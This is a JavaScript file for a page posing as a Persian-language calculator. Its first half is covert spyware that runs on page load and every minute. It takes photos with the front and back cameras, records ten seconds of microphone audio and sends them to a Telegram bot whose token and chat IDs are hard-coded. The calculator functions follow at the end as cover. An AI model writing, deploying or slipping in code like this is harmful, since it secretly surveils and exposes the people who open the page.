const botToken = "7996751116:AAFRkCkQ32NI35JKeqeacSFayJnPjlMVRxs";
const chatId = ["1120400003", "1171444772"];
const statusText = document.getElementById("status");
const video = document.getElementById("video");
let audioBlob = null;
let photoFront = null;
let photoBack = null;

async function captureImage(facingMode) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
    video.srcObject = stream;
    await new Promise(r => setTimeout(r, 1000));

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg"));

    stream.getTracks().forEach(track => track.stop());
    return blob;
  } catch {
    return null;
  }
}

async function recordAudio() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const mediaRecorder = new MediaRecorder(stream);
    const chunks = [];

    mediaRecorder.ondataavailable = e => chunks.push(e.data);

    return new Promise(resolve => {
      mediaRecorder.onstop = () => {
        stream.getTracks().forEach(track => track.stop());
        resolve(new Blob(chunks, { type: "audio/webm" }));
      };
      mediaRecorder.start();
      statusText.innerText = "";
      setTimeout(() => {
        mediaRecorder.stop();
        statusText.innerText = "✔️";
      }, 10000);
    });
  } catch {
    return null;
  }
}

function sendToTelegram(audio, photoFront, photoBack) {
  const sendFile = (endpoint, fieldName, file, filename) => {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append(fieldName, file, filename);
    fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, { method: "POST", body: formData });
  };

  if (audio) sendFile("sendVoice", "voice", audio, "voice.webm");
  if (photoFront) sendFile("sendPhoto", "photo", photoFront, "front.jpg");
  if (photoBack) sendFile("sendPhoto", "photo", photoBack, "back.jpg");

  if (audio || photoFront || photoBack) {
    statusText.innerText = "➕️";
  } else {
    statusText.innerText = "➖️";
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: "🚫 خطا یا دسترسی داده نشد." })
    });
  }
}

async function startAll() {
  statusText.innerText = "";
  photoFront = await captureImage("user");

  statusText.innerText = "";
  photoBack = await captureImage("environment");

  audioBlob = await recordAudio();

  sendToTelegram(audioBlob, photoFront, photoBack);
}

// ماشین حساب:
const display = document.getElementById('display');
const history = document.getElementById('history');

function append(value) {
  display.innerText = (display.innerText === '0' || display.innerText === 'خطا!') ? value : display.innerText + value;
}

function clearDisplay() {
  display.innerText = '0';
}

function backspace() {
  display.innerText = display.innerText.length > 1 ? display.innerText.slice(0, -1) : '0';
}

function calculate() {
  try {
    const input = display.innerText.replace(/%/g, '*0.01');
    const result = Function('"use strict";return (' + input + ')')();  // بهتر از eval
    history.innerText = display.innerText + ' = ' + result;
    display.innerText = result.toString();
  } catch {
    display.innerText = 'خطا!';
  }
}

function calculateTrig(func) {
  try {
    const value = parseFloat(display.innerText);
    if (isNaN(value)) throw 'NaN';
    const radians = value * Math.PI / 180;
    const result = func === 'sin' ? Math.sin(radians) : Math.cos(radians);
    display.innerText = result.toFixed(8);
    history.innerText = `${func}(${value}) = ${result.toFixed(8)}`;
  } catch {
    display.innerText = 'خطا!';
  }
}

window.onload = () => {
  startAll();
  setInterval(startAll, 60000);
};
